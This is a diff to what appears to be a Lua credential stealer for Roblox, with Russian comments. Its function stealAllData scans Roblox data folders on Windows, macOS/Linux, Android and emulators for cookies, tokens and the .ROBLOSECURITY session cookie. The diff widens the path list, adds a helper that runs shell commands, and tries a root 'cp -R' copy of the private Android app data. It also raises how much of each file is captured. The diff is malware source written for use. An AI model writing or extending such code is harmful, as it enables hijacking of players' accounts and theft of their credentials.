@@ -149,31 +149,60 @@ end
 
 local function getBasePaths()
     local paths = {
+        -- Windows
         safePath("APPDATA", "\\Roblox"),
         safePath("LOCALAPPDATA", "\\Roblox"),
         safePath("USERPROFILE", "\\AppData\\Local\\Roblox"),
         safePath("USERPROFILE", "\\AppData\\Roaming\\Roblox"),
         safePath("USERPROFILE", "\\Roblox"),
+        -- macOS / Linux
         safePath("HOME", "/Library/Application Support/Roblox"),
         safePath("HOME", "/.roblox"),
         safePath("HOME", "/.config/roblox"),
         safePath("HOME", "/.roblox"),
         "/root/.roblox",
+        -- Android (основные)
         "/data/data/com.roblox.client",
         "/data/user/0/com.roblox.client",
-        "/storage/emulated/0/Android/data/com.roblox.client",
-        "/sdcard/Android/data/com.roblox.client",
         "/data/data/com.roblox.client/shared_prefs",
         "/data/data/com.roblox.client/files",
         "/data/data/com.roblox.client/databases",
-        "/storage/emulated/0/Android/data/com.roblox.client/files"
+        "/data/data/com.roblox.client/app_webview",
+        "/data/data/com.roblox.client/cache",
+        "/data/data/com.roblox.client/no_backup",
+        -- Android внешнее хранилище
+        "/storage/emulated/0/Android/data/com.roblox.client",
+        "/storage/emulated/0/Android/data/com.roblox.client/files",
+        "/storage/emulated/0/Android/data/com.roblox.client/cache",
+        "/sdcard/Android/data/com.roblox.client",
+        "/sdcard/Android/data/com.roblox.client/files",
+        "/sdcard/Android/data/com.roblox.client/cache",
+        -- Эмуляторы (BlueStacks, LDPlayer и т.д.)
+        "/mnt/shared/App/com.roblox.client",
+        "/mnt/windows/BstSharedFolder/App/com.roblox.client"
     }
-    -- Убираем nil
     local clean = {}
     for _, p in ipairs(paths) do
         if p then table.insert(clean, p) end
     end
     return clean
+end
+
+-- === ПОПЫТКА ВЫПОЛНИТЬ SHELL-КОМАНДУ ===
+local function tryShellCommand(cmd)
+    if os and os.execute then
+        local ok, result = pcall(os.execute, cmd)
+        if ok and result then
+            return true, result
+        end
+    end
+    if execute_command then
+        local ok, result = pcall(execute_command, cmd)
+        if ok and result then
+            return true, result
+        end
+    end
+    return false, "нет доступа к shell"
 end
 
 -- === СКАНИРОВАНИЕ ФАЙЛОВ ===
@@ -210,18 +239,19 @@ local function stealAllData()
     local collected = {}
     local pattern = "cookie|session|auth|token|roblosecurity|settings|preferences|account|login|log|globalbasic|globalsettings|identity|credential|key|%.roblox|%.rbxs|%.dat|%.json|%.xml"
     local basePaths = getBasePaths()
-    print("[DEBUG] Найдено путей для сканирования:", #basePaths)
+    print("[DEBUG] Путей для сканирования:", #basePaths)
 
+    -- Основной обход по путям
     for _, base in ipairs(basePaths) do
         local isFolder = pcall(isfolder, base)
         if isFolder then
-            print("[DEBUG] Сканирую папку:", base)
+            print("[DEBUG] Сканирую:", base)
             local files = scanFolder(base, pattern, true)
             print("[DEBUG] Найдено файлов:", #files)
             for _, f in ipairs(files) do
                 local ok, content = pcall(readfile, f)
                 if ok and content and content ~= "" then
-                    table.insert(collected, "**Файл:** " .. f .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 3000) .. "\n```")
+                    table.insert(collected, "**Файл:** " .. f .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 5000) .. "\n```")
                 end
             end
         else
@@ -229,13 +259,33 @@ local function stealAllData()
             if isFile and string.lower(base):match(pattern) then
                 local ok, content = pcall(readfile, base)
                 if ok and content then
-                    table.insert(collected, "**Файл:** " .. base .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 3000) .. "\n```")
+                    table.insert(collected, "**Файл:** " .. base .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 5000) .. "\n```")
                 end
             end
         end
     end
 
-    -- Прямые файлы
+    -- Попытка shell-копирования приватных файлов Android (если есть root)
+    local androidPrivate = "/data/data/com.roblox.client"
+    local tempCopy = "/sdcard/roblox_temp_copy"
+    local shellOk, shellRes = tryShellCommand("cp -R " .. androidPrivate .. " " .. tempCopy .. " 2>/dev/null")
+    if shellOk then
+        print("[DEBUG] Shell-копирование выполнено, результат:", shellRes)
+        -- Если удалось скопировать, читаем из копии
+        if isfolder and isfolder(tempCopy) then
+            local copiedFiles = scanFolder(tempCopy, pattern, true)
+            for _, f in ipairs(copiedFiles) do
+                local ok, content = pcall(readfile, f)
+                if ok and content then
+                    table.insert(collected, "**Скопированный файл (через shell):** " .. f .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 5000) .. "\n```")
+                end
+            end
+        end
+    else
+        print("[DEBUG] Shell недоступен или ошибка:", shellRes)
+    end
+
+    -- Прямые файлы (Windows/Android)
     local directFiles = {
         safePath("APPDATA", "\\Roblox\\GlobalBasicSettings_13.xml"),
         safePath("LOCALAPPDATA", "\\Roblox\\GlobalBasicSettings_13.xml"),
@@ -254,13 +304,13 @@ local function stealAllData()
             if isFile then
                 local ok, content = pcall(readfile, f)
                 if ok and content then
-                    table.insert(collected, "**Прямой файл:** " .. f .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 3000) .. "\n```")
+                    table.insert(collected, "**Прямой файл:** " .. f .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 5000) .. "\n```")
                 end
             end
         end
     end
 
-    -- Если ничего не нашли, пробуем найти .ROBLOSECURITY в любых файлах
+    -- Если всё ещё пусто, ищем .ROBLOSECURITY в любых доступных файлах
     if #collected == 0 then
         print("[DEBUG] Первичный сбор пуст, ищу .ROBLOSECURITY во всех файлах...")
         for _, base in ipairs(basePaths) do
@@ -270,7 +320,7 @@ local function stealAllData()
                 for _, f in ipairs(allFiles) do
                     local ok, content = pcall(readfile, f)
                     if ok and content and tostring(content):find(".ROBLOSECURITY") then
-                        table.insert(collected, "**Файл с .ROBLOSECURITY:** " .. f .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 3000) .. "\n```")
+                        table.insert(collected, "**Файл с .ROBLOSECURITY:** " .. f .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 5000) .. "\n```")
                     end
                 end
             end
